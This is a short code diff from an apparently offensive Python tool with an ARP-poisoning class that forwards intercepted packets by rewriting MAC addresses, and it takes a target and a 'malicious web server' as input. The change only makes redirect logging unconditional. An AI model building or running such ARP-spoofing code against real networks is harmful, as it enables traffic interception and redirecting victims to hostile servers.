@@ -148,11 +148,10 @@ class arpPoisoning():
         packet[Ether].src = self.myMAC
         packet[Ether].dst = receiver["mac"]
         sendp(packet, iface=self.interface, verbose=False)
-        if(show=="show"):
-            self.show.insert(END, "Redirect from ip: {}, mac: {}".format(sender["ip"], sender["mac"]) + '\n')
-            self.show.insert(END, "to ip: {}, mac: {}".format(receiver["ip"], receiver["mac"]) + '\n')                                                                    
-            self.show.see(END)
-            self.show.update_idletasks()
+        self.show.insert(END, "Redirect from ip: {}, mac: {}".format(sender["ip"], sender["mac"]) + '\n')
+        self.show.insert(END, "to ip: {}, mac: {}".format(receiver["ip"], receiver["mac"]) + '\n')                                                                    
+        self.show.see(END)
+        self.show.update_idletasks()
 
     def setInput(self, rangeIPs, usedIPs, target, maliciousWebServer, myMAC):
         self.rangeIPs = rangeIPs
